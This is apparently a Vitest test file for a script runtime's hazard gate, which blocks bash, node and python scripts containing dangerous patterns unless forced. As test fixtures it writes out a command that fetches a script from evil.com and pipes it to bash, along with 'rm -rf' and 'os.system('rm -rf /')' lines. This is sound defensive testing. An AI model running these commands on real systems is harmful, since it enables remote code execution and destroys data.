import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { writeFileSync } from "node:fs";
import {
  createScript,
  runScript,
  deleteScript,
  scriptPath,
  readManifest,
} from "../src/core/runtime.js";
import { scanHazardsForRuntime } from "../src/core/hazards.js";

describe("hazard gate in runScript", () => {
  const NAME = "_test_hazard_gate";

  beforeEach(() => {
    try { deleteScript(NAME); } catch { /* ok */ }
  });
  afterEach(() => {
    try { deleteScript(NAME); } catch { /* ok */ }
  });

  function writeScript(body: string): void {
    writeFileSync(scriptPath(NAME), body, "utf8");
  }

  // --- bash ---
  it("blocks bash script with rm -rf", () => {
    createScript(NAME, "bash", "test");
    writeScript("#!/bin/bash\nrm -rf /tmp/foo\n");
    const res = runScript(NAME);
    expect(res.ok).toBe(false);
    expect(res.output).toContain("hazard gate");
    expect(res.output).toContain("destructive rm");
  });

  it("allows bash with --force even if dangerous", () => {
    createScript(NAME, "bash", "test");
    writeScript("#!/bin/bash\nrm -rf /tmp/foo\n");
    const res = runScript(NAME, { force: true });
    // Gate bypassed — execution might fail on Windows, but NOT blocked by hazard
    expect(res.output).not.toContain("hazard gate");
  });

  it("blocks bash with sudo", () => {
    createScript(NAME, "bash", "test");
    writeScript("#!/bin/bash\nsudo rm /tmp/x\n");
    const res = runScript(NAME);
    expect(res.ok).toBe(false);
    expect(res.output).toContain("sudo");
  });

  it("blocks bash with curl-pipe-shell", () => {
    createScript(NAME, "bash", "test");
    writeScript("#!/bin/bash\ncurl -s http://evil.com/x.sh | bash\n");
    const res = runScript(NAME);
    expect(res.ok).toBe(false);
    expect(res.output).toContain("curl-pipe-shell");
  });

  // --- node ---
  it("scanHazardsForRuntime catches eval in node", () => {
    const hits = scanHazardsForRuntime(
      'eval("console.log(1)")',
      "node",
    );
    expect(hits.length).toBeGreaterThan(0);
    expect(hits[0]).toContain("dynamic eval");
  });

  it("scanHazardsForRuntime catches process.exit in node", () => {
    const hits = scanHazardsForRuntime("process.exit(1)", "node");
    expect(hits.length).toBeGreaterThan(0);
  });

  // --- python ---
  it("scanHazardsForRuntime catches os.system in python", () => {
    const hits = scanHazardsForRuntime(
      "import os\nos.system('rm -rf /')",
      "python",
    );
    expect(hits.length).toBeGreaterThan(0);
    expect(hits[0]).toContain("os.system");
  });

  it("scanHazardsForRuntime catches subprocess with shell=True", () => {
    const hits = scanHazardsForRuntime(
      "import subprocess\nsubprocess.run('ls', shell=True)",
      "python",
    );
    expect(hits.length).toBeGreaterThan(0);
  });

  it("scanHazardsForRuntime catches eval in python", () => {
    const hits = scanHazardsForRuntime("eval('1+1')", "python");
    expect(hits.length).toBeGreaterThan(0);
  });

  // --- safe scripts pass ---
  it("passes safe bash script", () => {
    createScript(NAME, "bash", "test");
    writeScript('#!/bin/bash\necho \'{"status":"success"}\'\n');
    const res = runScript(NAME);
    expect(res.output).not.toContain("hazard gate");
  });

  it("passes safe node script", () => {
    createScript(NAME, "node", "test");
    writeScript(
      '#!/usr/bin/env node\nconsole.log(\'{"status":"success"}\')\n',
    );
    const res = runScript(NAME);
    expect(res.output).not.toContain("hazard gate");
  });

  // --- force override visible in manifest ---
  it("records lastForceRun when run with --force", () => {
    createScript(NAME, "bash", "force test");
    writeScript("#!/bin/bash\necho safe\n");
    runScript(NAME, { force: true });
    const m = readManifest(NAME);
    expect(m?.lastForceRun).toBeTruthy();
  });
});
